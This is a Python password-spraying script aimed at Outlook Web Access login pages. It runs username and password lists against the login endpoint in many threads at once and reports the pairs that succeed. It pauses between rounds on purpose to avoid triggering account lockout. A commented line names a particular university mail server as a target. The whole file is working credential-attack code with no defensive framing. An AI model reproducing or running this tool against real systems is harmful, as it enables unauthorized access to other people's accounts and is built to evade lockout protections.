import queue
import threading
import time
import random
import time
import sys
import requests
from argparse import ArgumentParser, RawTextHelpFormatter, SUPPRESS
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
lock = threading.Semaphore()

class Spray:
    def __init__(self):
        self.userfile   = usr_file
        self.pwdfile    = pwd_file

    def spray(self):
        q = queue.Queue()
        usernames = self.get_users()
        passwords = self.get_pwds(self.pwdfile)

        i = 0
        while len(passwords) > 0:
            pwd = passwords.pop()
            if i >= attempts:
                self.avoid_lockout()
                i = 0

            for user in usernames:
                q.put([user, pwd])

            while not q.empty():
                tcount = threading.active_count()
                if tcount < threads:
                    p = threading.Thread(target=login, args=(q.get(),))
                    p.start()
                else:
                    time.sleep(1)

            tcount = threading.active_count()
            while tcount > 1:
                # Waiting for threads to finish
                time.sleep(1)
                tcount = threading.active_count()
            i += 1

    def get_users(self):
        usernames = []
        with open(self.userfile, encoding="utf8") as f:
            raw = f.readlines()
        for user in raw:
            usernames.append(user.strip())

        return sorted(usernames)

    @staticmethod
    def get_pwds(pwdfile):
        pwds = []
        with open(pwdfile, encoding="utf8") as f:
            raw = f.readlines()
        for pwd in raw:
            pwds.append(pwd.strip())
        return pwds

    @staticmethod
    def avoid_lockout():
        window = random.uniform(3, 5)
        msg = f"\n[*] Waiting {window} minute(s) in order to avoid account lockout.".format(window=window)
        print(msg)
        time.sleep(window * 60)

def login(user_pwd):
    user, pwd = user_pwd
    payload = {'destination': server,'flags': 4,'forcedownlevel': 0,'username': user,'password': pwd,'passwordText': '','isUtf8': 1}
    r = requests.post(server, data=payload, verify=False, allow_redirects=False)
    if r.status_code == 302:
        cookies = r.cookies
        cookie_num = len(cookies)
        if cookie_num >= num_cookies:
            msg = f"[***] Sucessed => '{user}' : '{pwd}'".format(user=user, pwd=pwd)
            lock.acquire()
            print(msg)
            lock.release()
        else:
            lock.acquire()
            print(f"[-] Failed login for: '{user}' : '{pwd}'".format(user=user, pwd=pwd))
            lock.release()
    else:
        lock.acquire()
        print('\n[!] Wrong status code' + str(r.status_code))
        lock.release()

if __name__ == '__main__':
    parser = ArgumentParser(formatter_class=RawTextHelpFormatter, usage=SUPPRESS)
    parser.add_argument('-s', '--server', help='Target url in the form of "https://mail.example.com/owa/auth.owa"', required=True)
    parser.add_argument('-u', '--users', help='Usernames list', required=True)
    parser.add_argument('-p', '--pwds', help='Passwords list')
    parser.add_argument('-t', '--threads', help='Number of threads. Default is 10', default=10)
    try:
        args = vars(parser.parse_args())
    except:
        parser.print_help()
        sys.exit(0)
    # server = "https://mail.spa.msu.ru/owa/auth.owa"
    server = args["server"]
    attempts = 3
    threads = args["threads"]     
    usr_file = args["users"]  
    pwd_file = args["pwds"]  
    num_cookies = 4
    spray = Spray()
    spray.spray()